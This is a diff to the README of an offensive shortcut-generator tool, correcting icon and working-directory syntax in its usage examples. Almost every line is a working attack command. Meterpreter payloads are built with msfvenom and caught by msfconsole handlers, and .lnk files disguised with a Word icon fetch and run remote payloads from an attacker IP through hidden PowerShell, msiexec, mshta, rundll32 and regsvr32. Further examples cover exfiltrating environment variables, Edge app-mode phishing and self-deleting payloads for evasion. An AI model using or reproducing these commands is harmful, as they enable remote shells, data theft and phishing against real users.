@@ -49,7 +49,7 @@ Flags:
 
 #### Windows
 
-Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it. For a custom icon (`--icon`) you must either specify an index or an absolute path of the executable.
+Generate the shell link while hosting a webserver to stage a PowerShell (`.ps1`) payload to trigger it. For a custom icon (`--icon`) you must either specify an index or an absolute path of the file/executable with a suffix of zero (e.g., `C:\path\to\file,0`) otherwise it won't generate and result an error. The working directory (`--workingdirectory`) will be executed if you placed a dropper that touches the disk unless you're staging it so be careful with this option.
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-reflection -o payload.ps1
@@ -58,7 +58,7 @@ $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterp
 
 $ sudo python -m http.server 80
 C:\Windows\System32\
-$ shortcutgen -p lnk -c "powershell.exe" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "powershell.exe" -a "-nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http[s]://<attacker_IP>/payload.ps1'))\"" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
 ```
 
 Generate the shell link while hosting a webserver to stage a MSI installer (`.msi`) payload to trigger it.
@@ -70,7 +70,7 @@ $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterp
 
 $ sudo python -m http.server 80
 
-$ shortcutgen -p lnk -c "C:\Windows\System32\msiexec.exe" -a "/quiet /qn /i http://<attacker_IP>/payload.msi" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\msiexec.exe" -a "/quiet /qn /i http://<attacker_IP>/payload.msi" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
 ```
 
 Generate the shell link then automatically hosting a staging HTA payload (`.hta`) using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.
@@ -78,7 +78,7 @@ Generate the shell link then automatically hosting a staging HTA payload (`.hta`
 ```
 $ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"
 
-$ shortcutgen -p lnk -c "C:\Windows\System32\mshta.exe" -a "http[s]://<attacker_IP>/payload.hta" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\mshta.exe" -a "http[s]://<attacker_IP>/payload.hta" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
 ```
 
 Generate the shell link then automatically hosting a staging DLL payload (`.dll`) using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.
@@ -86,7 +86,7 @@ Generate the shell link then automatically hosting a staging DLL payload (`.dll`
 ```
 $ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name payload.dll; set share staging; exploit"
 
-$ shortcutgen -p lnk -c "C:\Windows\System32\rundll32.exe" -a "\\<attacker_IP>\staging\payload.dll,0" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\rundll32.exe" -a "\\<attacker_IP>\staging\payload.dll,0" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
 ```
 
 Generate the shell link then automatically hosting a staging scriptlet payload (`.sct`) using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
@@ -94,7 +94,7 @@ Generate the shell link then automatically hosting a staging scriptlet payload (
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath payload; exploit"
 
-$ shortcutgen -p lnk -c "C:\Windows\System32\regsvr32.exe" -a "/s /n /u /i://http://<attacker_IP>:<attacker_PORT>/payload.sct scrobj.dll" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe" -w "minimized" --workingdirectory "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\regsvr32.exe" -a "/s /n /u /i://http://<attacker_IP>:<attacker_PORT>/payload.sct scrobj.dll" --icon "C:\Program Files\Microsoft Office\root\Office16\winword.exe,0" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
 ```
 
 #### Linux
@@ -132,7 +132,7 @@ $ shortcutgen -p lnk -i "fileserver" -s "Documents" -n "document.docx" -o payloa
 To exfiltrate environment variables.
 
 ```
-$ shortcutgen -p lnk -i "fileserver" -e "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS" -s "Documents" -n "document.docx" -w "minimized" -o payload.lnk
+$ shortcutgen -p lnk -i "fileserver" -e "COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS" -s "Documents" -n "document.docx" -w "minimized" -o payload.lnk
 ```
 
 ### 0x02 - Phishing
@@ -140,7 +140,7 @@ $ shortcutgen -p lnk -i "fileserver" -e "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PR
 You can send a targeted phishing campaign using chromium-based web browsers in application mode from [mrd0x's blog post](https://mrd0x.com/phishing-with-chromium-application-mode/).
 
 ```
-$ shortcutgen -p lnk -c "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -a "--app=http://192.168.1.4" -i "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -o Office365.lnk
+$ shortcutgen -p lnk -c "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -a "--app=http://192.168.1.4" --icon "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,0" -o Office365.lnk
 ```
 
 ### 0x03 - Defense Evasion
@@ -150,7 +150,7 @@ $ shortcutgen -p lnk -c "C:\Program Files (x86)\Microsoft\Edge\Application\msedg
 You can of course self delete the payload after execution.
 
 ```
-$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c mshta.exe http[s]://<attacker_IP>/payload.hta & del %CD%\payload.lnk" --icon "C:\path\to" -w "minimized" -wd "C:\Users\Public\" -o payload.lnk
+$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c mshta.exe http[s]://<attacker_IP>/payload.hta & del %CD%\payload.lnk" --icon "C:\path\to" -w "minimized" --workingdirectory "C:\\Users\\Public\\" -o payload.lnk
 ```
 
 Including `.desktop` file.
